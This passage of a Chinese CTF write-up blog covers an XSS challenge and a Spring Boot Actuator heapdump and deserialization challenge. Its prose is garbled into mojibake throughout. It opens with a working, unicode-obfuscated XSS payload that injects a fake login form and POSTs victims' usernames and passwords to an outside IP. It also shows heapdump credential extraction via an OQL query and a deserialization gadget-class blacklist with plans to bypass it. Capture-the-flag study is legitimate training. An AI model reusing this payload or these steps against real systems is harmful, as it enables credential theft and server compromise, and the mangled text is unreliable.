class="line">remark=&lt;/a&gt;&lt;sCRiPt&gt;document.write`\u003c\u0068\u0074\u006d\u006c\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0068\u0065\u0061\u0064\u003e\u003c\u002f\u0068\u0065\u0061\u0064\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0062\u006f\u0064\u0079\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0066\u006f\u0072\u006d\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u006d\u002d\u0074\u0022\u0020\u006f\u006e\u0073\u0075\u0062\u006d\u0069\u0074\u003d\u0022\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0066\u0061\u006c\u0073\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0069\u0064\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0055\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0069\u0064\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0074\u0079\u0070\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0050\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0062\u0075\u0074\u0074\u006f\u006e\u0020\u006f\u006e\u0063\u006c\u0069\u0063\u006b\u003d\u0022\u0066\u0065\u0074\u0063\u0068\u0028\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0034\u0033\u002e\u0031\u0034\u0033\u002e\u0031\u0039\u0032\u002e\u0031\u0039\u003a\u0031\u0031\u0034\u0035\u002f\u0027\u002c\u007b\u006d\u0065\u0074\u0068\u006f\u0064\u003a\u0027\u0050\u004f\u0053\u0054\u0027\u002c\u0062\u006f\u0064\u0079\u003a\u0024\u0028\u0027\u0023\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u002b\u0027\u005f\u005f\u005f\u0027\u002b\u0024\u0028\u0027\u0023\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u007d\u0029\u003b\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u006c\u006f\u0067\u0069\u006e\u0022\u003e\u004c\u006f\u0067\u0069\u006e\u003c\u002f\u0062\u0075\u0074\u0074\u006f\u006e\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0066\u006f\u0072\u006d\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u002f\u0062\u006f\u0064\u0079\u003e\u000a\u003c\u002f\u0068\u0074\u006d\u006c\u003e`&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./npc -config ./conf/npc.conf</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101233054.png" alt="å¾®ä¿¡æˆªå›¾_20231101233054"></p><p>ç»ˆäºæ‹¿åˆ°äº†è‰¹,30sç‚¹ä¸€æ¬¡,ğŸ‘´tmä»¥ä¸ºxä¸è¿›å»äº†</p><p>ã¾ã ã¾ã ã­ã€å¼±ã„ï¼</p><h1 id="deserializeupload"><span id="deserializeupload"> Deserialize?Upload!</span></h1><h2 id="actuator"><span id="actuator"> actuatorğŸ˜«</span></h2><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102082010.png" alt="å¾®ä¿¡æˆªå›¾_20231102082010"></p><p>é¦–å…ˆ,é¢˜ç›®æœ‰ä¸ªğŸš¢â™¥çš„ä¾èµ–,æ˜¾ç„¶ğŸ‘´ä¸çŸ¥é“è¿™æ˜¯å¹²å•¥çš„,æ€ä¹ˆåŠ,å­¦!</p><p><a href="https://www.cnblogs.com/caoweixiong/p/15325382.html">Spring bootâ€”â€”Actuator è¯¦è§£ - æ›¹ä¼Ÿé›„ - åšå®¢å›­ (cnblogs.com)</a></p><p>é…ç½®æ–¹é¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>æœ‰äº†è¿™ä¸ªä¾èµ–,é‚£ä¹ˆSpringå°±ä¼šè‡ªåŠ¨å¼€æ”¾<code>/actuator/health</code>å’Œ<code>/actuator/info</code>è¿™ä¸¤ä¸ªè·¯å¾„</p><p>è®¿é—®<code>[127.0.0.1:9090/actuator/](http://127.0.0.1:9090/actuator/)</code>,å¯ä»¥å¾—åˆ°/acturatorçš„è·¯ç”±</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;_links&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;self&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;health&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/health&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;health-path&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/health/&#123;*path&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;info&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/info&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;env&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/env&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;env-toMatch&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/env/&#123;toMatch&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;heapdump&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/heapdump&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä¸€äº›ç»å¸¸ä½¿ç”¨çš„è·¯å¾„</p><table><thead><tr><th style="text-align:center">HTTPæ–¹æ³•</th><th style="text-align:center">Endpoint</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator</td><td style="text-align:center">æŸ¥çœ‹æœ‰å“ªäº›è·¯å¾„</td></tr><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator/env</td><td style="text-align:center">æŸ¥çœ‹æ‰€æœ‰ç¯å¢ƒå±æ€§,çœ‹Springçš„çš„properties,ä½†æ˜¯ä¼šè‡ªåŠ¨è„±æ•æ‰ä¸€äº›secret keyç­‰æ•æ„Ÿä¿¡æ¯</td></tr><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator/health</td><td style="text-align:center">æŸ¥çœ‹è¿è¡ŒæŒ‡æ ‡</td></tr><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator/info</td><td style="text-align:center">æŸ¥çœ‹ properties ä¸­ info å¼€å¤´çš„å±æ€§ï¼Œæ²’å•¥ç”¨</td></tr><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator/heapdump</td><td style="text-align:center">è·å–JVMçš„heap dump</td></tr></tbody></table><p>ğŸ¤£é»˜è®¤Actuator <code>/actuator/health</code>å’Œ<code>/actuator/info</code>ä¸¤ä¸ª endpointï¼Œå¦‚æœè¦å¼€æ”¾å…¶ä»– endpoint çš„è©±ï¼Œéœ€åœ¨åœ¨ application.properties ä¸­åšè®¾ç½®ã€‚<img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102085646.png" alt="å¾®ä¿¡æˆªå›¾_20231102085646"></p><p>Heap dumpï¼ˆå †è½¬å‚¨ï¼‰æ˜¯æŒ‡å°†ä¸€ä¸ª Java è¿›ç¨‹çš„å†…å­˜ä¸­çš„å¯¹è±¡ä¿¡æ¯å’Œæ•°æ®ç»“æ„ä»¥äºŒè¿›åˆ¶æ ¼å¼å†™å…¥æ–‡ä»¶ï¼Œä»¥ä¾¿è¿›è¡Œå†…å­˜åˆ†æå’Œæ’æŸ¥å†…å­˜æ³„æ¼ç­‰é—®é¢˜ã€‚Heap dump åŒ…å«äº† Java å †å†…å­˜ä¸­çš„å¯¹è±¡å®ä¾‹ã€å¯¹è±¡å¼•ç”¨å…³ç³»ã€ç±»ä¿¡æ¯ç­‰ï¼Œå®ƒæ˜¯è¯Šæ–­å’Œè°ƒè¯• Java åº”ç”¨ç¨‹åºçš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚</p><p>ğŸ‘´è¯´ç‚¹äººè¯:åæ­£Heap dumpäº‹å†…å­˜ç›¸å…³çš„ä¸œè¥¿,è‚¯å®šæœ‰æ•æ„Ÿä¿¡æ¯,ğŸ‘´å°±æ˜¯è¦æŠŠå®ƒä¸‹ä¸‹æ¥è¿›è¡Œä¸€é€šä¹±è¶…,ä¸çŸ¥é“ä½ ä»¬æ€ä¹ˆå¿å¾—ä½çš„,äº‹ğŸ‘´ç›´æ¥æ‹¿èµ·æ¥ç‹ ç‹ åœ°åˆ†æ.</p><p>æ€ä¹ˆåˆ†æ,å½“æ—¶äº‹ç”¨jdkè‡ªå¸¦çš„jhat</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jhat -J-Xmx512M <span class="string">&quot;/path/to/heapdump&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šæœ¬åœ°èµ·ä¸€ä¸ªæœåŠ¡å™¨,é‡Œé¢å°±åŠ è½½å†…å­˜çš„å†…å®¹</p><p>md,ä¾æ‰˜âœç‰¹,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">securityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http.authorizeRequests().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;)).permitAll().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/admin/**&quot;</span>&#125;)).authenticated().and()).formLogin().loginProcessingUrl(<span class="string">&quot;/login&quot;</span>)).permitAll()).and()).csrf().disable();</span><br><span class="line">        <span class="keyword">return</span> (SecurityFilterChain)http.build();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ğŸ§€springå®‰å…¨é…ç½®,<code>http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;).permitAll()</code>è¡¨ç¤ºå¯¹/è·¯ç”±è®¿é—®å…è®¸ä»»æ„ç”¨æˆ·,</p><p><code>antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;).authenticated()</code>è¡¨ç¤º<code>/admin/</code>å¼€å¤´éªŒè¯ç”¨æˆ·</p><p><code>.formLogin().loginProcessingUrl(&quot;/login&quot;).permitAll()</code>/loginçš„è¡¨è¾¾ç™»å½•ä¸éœ€è¦éªŒè¯</p><p>è¿™é‡Œå°±æ˜¯è®©ğŸ‘´æ‹¿åˆ°password</p><h2 id="é¢˜ç›®å®è·µ"><span id="é¢˜ç›®å®è·µ"> é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡</span></h2><p>wcsndm,sbä¸œè¥¿,é¢˜ç›®ç¯å¢ƒæ²¡äº†,è¡Œå§,ğŸ‘´æœ¬åœ°æ­ä¸€ä¸ª,nmdå¥—æ¨¡æ¿æ•´äº†ä¸ªdocker-compose,å‘Šè¯‰ğŸ‘´nmd<code>project name must not be empty</code>,ä½ tmdå€’æ˜¯å‘Šè¯‰ğŸ‘´å“ªé‡Œæ²¡æœ‰project name,é˜¿ç±³è¯ºæ–¯,ä¸€æ ¼å¾·æ‹‰ç±³.</p><p>åªèƒ½æ‰‹åŠ¨docker build.</p><p>åŒæ ·æ‹¿åˆ°heapdump</p><p>ç›´æ¥æ‰“å¼€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvisualvm</span><br></pre></td></tr></table></figure><p>åˆ«é—®ğŸ‘´å“ªé‡Œè£…,è¿™nmjavaè‡ªå¸¦çš„</p><p>è¿›è¡Œä¸€æ³¢OQLæŸ¥è¯¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨çš„äº‹æ­£åˆ™æµ‹è¯• /rgexp/.test()çš„å½¢å¼,è™½ç„¶é‡Œé¢å†…å®¹æ²¡ç”¨åˆ°å•¥æ­£åˆ™,åªæ˜¯èµ°ä¸ªå½¢å¼è€Œå·²,åˆ«é—®ğŸ‘´ä¸ºå•¥ä¸ç›´æ¥æŸ¥value,nmd valueæ˜¯ä¸ªå¯¹è±¡è¿˜æœªçŸ¥,ä½ æŸ¥ä¸ªâˆšâ‘§.</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102101315.png" alt="å¾®ä¿¡æˆªå›¾_20231102101315"></p><p>tmd /loginç™»è¿›å»,è®©ğŸ‘´çœ‹çœ‹æ€ä¹ˆä¸ªäº‹</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102102004.png" alt="å¾®ä¿¡æˆªå›¾_20231102102004"></p><p>æºèµ–æ°ä¸€ä¸ªåå°ç®¡ç†ç³»ç»Ÿ,èƒ½ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„åœ°æ–¹.</p><h2 id="ååºåˆ—åŒ–åˆ†æ"><span id="ååºåˆ—åŒ–åˆ†æ"> ååºåˆ—åŒ–åˆ†æğŸ˜›</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/deserialize&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="meta">@RequestParam(&quot;b64str&quot;)</span> String b64str)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] serialized = Base64.getDecoder().decode(b64str);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">SafeObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SafeObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¾ˆç¾å¥½å¯¹å§,jacksoné“¾ç›´æ¥æ‰“,ä½†æ˜¯ğŸ‘´å‘ç°äº†ä¸å¯¹åŠ²,mdæœ‰æ¯’</p><p>è¿˜æ˜¯çœ‹çœ‹è¿œå¤„çš„<code>SafeObjectInputStream</code>å§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SafeObjectInputStream</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>(is);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass input) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (BLACKLIST.contains(input.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Hacker!!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.fasterxml.jackson.databind.node.POJONode&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>éƒ½ç»™ä½ banäº†,rnm,å‡ºé¢˜äººçœŸçš„é˜´é™©,ç°åœ¨ä¸æŠŠjacksoné“¾banäº†,éƒ½ä¸æ•¢ååºåˆ—åŒ–äº†æ˜¯å§ğŸ˜…</p><p>æ€ä¹ˆç»˜ä¸–å‘¢</p><h2 id="æ–‡ä»¶ä¸Šä¼ ååºåˆ—åŒ–ç»„åˆæ‹³"><span id="æ–‡ä»¶ä¸Šä¼ ååºåˆ—åŒ–ç»„åˆæ‹³"> æ–‡ä»¶ä¸Šä¼ +ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤</span></h2><p>é¢˜ç›®ç»™äº†æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½,é‚£æ€»ä¸èƒ½ä¸ç”¨å§,è¦ä¸ç„¶é¢˜ç›®æ•´è¿™Î²Ã·ç©æ„å¹²å˜›å‘€.ğŸ˜…</p><p>æ­£å¥½å‰é¢é€šè¿‡envæ³„éœ²å¾—çŸ¥java_homeçš„ä½ç½®</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102103809.png" alt="å¾®ä¿¡æˆªå›¾_20231102103809"></p><p>ä»€ä¹ˆ,ä½ ä¸çŸ¥é“java_homeäº‹å¹²å˜›çš„?</p><p>æ¥,è·ŸğŸ‘´ä¸€èµ·å¿µ:</p><p><code>JAVA_HOME</code> æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºæŒ‡ç¤º Java å¼€å‘å·¥å…·å’Œåº”ç”¨ç¨‹åºåœ¨è®¡ç®—æœºä¸Šçš„å®‰è£…ä½ç½®ã€‚å®ƒä¸»è¦ç”¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢çš„ä½œç”¨ï¼š</p><ol><li><strong>Java å¼€å‘å·¥å…·çš„å®šä½</strong>ï¼š<code>JAVA_HOME</code> å˜é‡å‘Šè¯‰è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿå’Œå…¶ä»–å¼€å‘å·¥å…· Java å¼€å‘å·¥å…·çš„å®‰è£…ä½ç½®ã€‚è¿™å¯¹äºç¼–è¯‘ã€è¿è¡Œå’Œè°ƒè¯• Java ç¨‹åºéå¸¸é‡è¦ã€‚ä¾‹å¦‚ï¼Œå½“ä½ ä½¿ç”¨ Java ç¼–è¯‘å™¨ (<code>javac</code>) ç¼–è¯‘ Java ä»£ç æ—¶ï¼Œç³»ç»Ÿéœ€è¦çŸ¥é“ <code>JAVA_HOME</code> çš„ä½ç½®ä»¥æ‰¾åˆ° <code>javac</code> å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li><li><strong>Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„å®šä½</strong>ï¼šé™¤äº†å¼€å‘å·¥å…·ï¼Œ<code>JAVA_HOME</code> ä¹Ÿå¯ä»¥ç”¨äºå®šä½ Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„ä½ç½®ã€‚JRE åŒ…å«äº†è¿è¡Œ Java åº”ç”¨ç¨‹åºæ‰€éœ€çš„ç±»åº“å’Œè¿è¡Œæ—¶ç»„ä»¶ã€‚å¦‚æœä½ çš„ç³»ç»Ÿä¸Šæœ‰å¤šä¸ªä¸åŒç‰ˆæœ¬çš„ Java å®‰è£…ï¼Œè®¾ç½® <code>JAVA_HOME</code> å¯ä»¥ç¡®ä¿ä½ ä½¿ç”¨çš„æ˜¯æ­£ç¡®çš„ Java ç‰ˆæœ¬ã€‚</li><li><strong>åº”ç”¨ç¨‹åºçš„å®šä½</strong>ï¼šæŸäº› Java åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦çŸ¥é“ Java çš„å®‰è£…ä½ç½®ï¼Œä»¥ä¾¿æ­£ç¡®é…ç½®è‡ªå·±ã€‚é€šè¿‡è®¾ç½® <code>JAVA_HOME</code> ç¯å¢ƒå˜é‡ï¼Œè¿™äº›åº”ç”¨ç¨‹åºå¯ä»¥è½»æ¾æ‰¾åˆ°æ‰€éœ€çš„ Java è¿è¡Œæ—¶ç¯å¢ƒã€‚</li><li><strong>å¼€å‘å·¥å…·å’Œæ„å»ºå·¥å…·çš„é…ç½®</strong>ï¼šè®¸å¤š Java é›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰å’Œæ„å»ºå·¥å…·ï¼ˆå¦‚ Maven å’Œ Gradleï¼‰ä½¿ç”¨ <code>JAVA_HOME</code> å˜é‡æ¥é…ç½®å…¶å†…éƒ¨ä½¿ç”¨çš„ Java ç¯å¢ƒã€‚è¿™æœ‰åŠ©äºç¡®ä¿é¡¹ç›®åœ¨æ­£ç¡®çš„ Java ç‰ˆæœ¬ä¸‹ç¼–è¯‘å’Œè¿è¡Œã€‚</li><li><strong>è·¨å¹³å°å…¼å®¹æ€§</strong>ï¼šé€šè¿‡ä½¿ç”¨ <code>JAVA_HOME</code> å˜é‡ï¼Œå¯ä»¥ä½¿ Java å¼€å‘ç¯å¢ƒåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šæ›´å…·å¯ç§»æ¤æ€§ã€‚å®ƒå…è®¸å¼€å‘äººå‘˜ç¼–å†™ä¸€æ¬¡ä»£ç ï¼Œç„¶ååœ¨ä¸åŒå¹³å°ä¸Šä½¿ç”¨ç›¸åŒçš„ <code>JAVA_HOME</code> å˜é‡æ¥è¿è¡Œä»£ç ã€‚</li></ol><p>æ€»ä¹‹ï¼Œ<code>JAVA_HOME</code> æ˜¯ä¸€ä¸ªå…³é”®çš„ç¯å¢ƒå˜é‡ï¼Œç”¨äºç¡®ä¿è®¡ç®—æœºä¸Šçš„ Java å¼€å‘å·¥å…·ã€åº”ç”¨ç¨‹åºå’Œè¿è¡Œæ—¶ç¯å¢ƒèƒ½å¤Ÿæ­£ç¡®åœ°æ‰¾åˆ°å’Œä½¿ç”¨ Java å®‰è£…ã€‚å®ƒåœ¨ Java å¼€å‘å’Œéƒ¨ç½²è¿‡ç¨‹ä¸­èµ·åˆ°é‡è¦ä½œç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤šç‰ˆæœ¬ Java å®‰è£…å’Œè·¨å¹³å°å¼€å‘çš„æƒ…å†µä¸‹ã€‚</p><p>ä¸è¯´äººè¯å°±æ˜¯è¿™æ ·,è¿™æ˜¯ä¼Ÿå¤§çš„ChatGPTè¯´çš„,ğŸ‘´ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯,è¿è¡Œè„šæœ¬çš„ä½ç½®åœ¨é‚£,è¦è¿è¡Œçš„classä¹Ÿåœ¨é‚£,æ‰€ä»¥æœ‰å•¥classæ”¾é‚£,ä»–å°±èƒ½åŠ 